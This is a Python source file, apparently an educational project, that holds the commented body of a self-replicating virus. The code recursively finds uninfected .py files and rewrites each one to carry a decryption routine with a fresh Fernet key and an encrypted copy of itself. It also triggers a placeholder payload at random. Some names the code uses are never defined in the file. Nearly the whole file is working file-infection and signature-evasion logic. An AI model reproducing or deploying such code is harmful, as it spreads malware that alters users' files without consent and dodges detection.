# -*- coding: utf-8 -*-
"""
Created on Wed Feb 16 16:42:37 2022

@author: vivek
"""
# This file is body of virus it's encrypted form has been added in the virus file
# This code is annoted for better understanding

##### VIRUS START #####

# Importing the required libraries
import os                # for getting directories and files in it
from random import random # for generating probability for payload execution

# This selectTarget function searches for all patential target files in the given directory path

def selectTarget(path):
    targets_list = []         # list holding all target files
    targets = os.listdir(path) # get all files in given path directory
    
    # for each target file in targets
    for target in targets:
        # if given target is itself a directory
        if os.path.isdir(path+"/"+target):
            # then extend the targets_list by recursively calling the selectTarget function
            targets_list.extend(selectTarget(path+"/"+target))
        
        # else check whether the target file in consideration is a .py (python executable file)
        # by checking the last 3 characters of filename
        elif target[-3:] == ".py":
            infected = False       # assuming current target file to be not infected
            
            # open the given target file and check it line by line
            for line in open(path+"/"+target):
                
                #if line has some kind of signature related to presence of virus code
                if line.strip() == '##### Start Decryption routine #####':
                    # then mark infected variable as true
                    infected = True
                    # and break out of loop
                    break
            # if target file is not infected
            if not infected:
                # append the file to targets_list
                targets_list.append(path+"/"+target)
                
    # in the end return the targets_list containing all potential(.py) files
    return targets_list

# This copyCode function will copy encrypted virus code in all target files in targets_list
def copyCode(targets_list):
    
    # for each target file in targets_list
   for target in targets_list:
       
       # first rename the 'target' file as 'target_copy'
       os.rename(target, target + '_copy')
       
       # open a new file named as original 'target' as destination, in write mode
       destination = open(target, 'w')
       
       # open the renamed original target file 'target_copy' as source in read mode
       source = open(target + '_copy', 'r')
       
       # open the current executing file containing the virus code as this in read mode
       this = open(__main__.__file__, 'r')
       
       # In 1st phase, write the original code to initially empty destination file from source
       destination.write(source.read())
       
       # generate a random key using the fernet library key generator,
       # which will be used to encrypt the virus code to some random form
       key = Fernet.generate_key()
       
       # Now in 2nd phase start writing the Decryption routine in destination(target) file
       # writing start signature for Decryption routine
       destination.write("\n##### Start Decryption routine #####\n")
       
       skip = 0     # this var will be helping in writing key in the decryption routine
       
       copy = False # will make true when we will be scanning through decryption routine
       
       # iterating over each line in this file
       for line in this:
           
           # if we get the start signature for Decryption routine in line
          if line.strip() == '##### Start Decryption routine #####':
             
             # write the above generated key(will be used in decrypting when infected program executes)
             destination.write(str(key)+'\n')
             copy = True # also making it true, as we have to write whole decryption routine
             # will skip the line just below start signature for Decryption routine
             # As there will be previous key written there, used for decrypting this virus code in execution
             skip = 1 
             
            #  if we get the end signature for Decryption routine in line
          elif line.strip() == '##### End Decryption routine #####':
              # write the end signature of Decryption routine
             destination.write(line)
             # make copy false as Decryption routine has ended
             copy = False
             
            # while copy remains true write the line in destination 
          elif copy:
              if skip: # skip line just below start signature for Decryption routine
                  skip = 0
                  continue # previous key of virus code will not be written
              destination.write(line);
             
    # In 3rd phase start writing the encrypted virus
    # write signature for marking virus begining
       destination.write("\n##### VIRUS BEGINS #####\n")
       
       # create a fernet object using the new key generated above(also written in Decryption routine)
       cipher = Fernet(key)
       # write the encrypted code with newly generated key cipher object in destination(target) file
       # decoded_code of virus will be decoded by Decryption routine
       destination.write(str(cipher.encrypt(decoded_code)))
       
       # write signature for marking virus ending
       destination.write("\n##### VIRUS ENDS #####") 
       # Now close source file (temporary copy created of target), also remove it
       source.close()
       os.remove(target + '_copy')
       # close the modified target file 
       destination.close()
       # close the current executing this file
       this.close()
       
# This payload function is executed with 1/4 probability.
# it is harmless here but could be a harmful function in a real virus
def payload():
    print("Payload executed")
    print("Damage done")   

# This infect function gets all potential target files and then call copyCode to infect.
def infect():
    # get the path of directory in which the virus program resides
    path = os.path.abspath("")
    
    # call to selectTarget to get all patential target files
    targets_list = selectTarget(path)
    
    # if targets_list is empty
    if not targets_list:
        print("No target")
        # then call payload function with prob. 1/4
        # random generates no. between 0-1 by default,
        # So when it generates no. less than 0.25, payload() will be called with a probability of 1/4
        # As no. less than 0.25 are 1/4th of no.s generated between 0-1.
        if random() < 0.25:
            payload();
    
    # Else if targets_list is not empty it will call copyCode() to infect target files with virus code
    else:
        copyCode(targets_list)


############################ START OF EXECUTION ##############################
# Virus body code will start by calling infect function having no parameters 
infect()
##### VIRUS END #####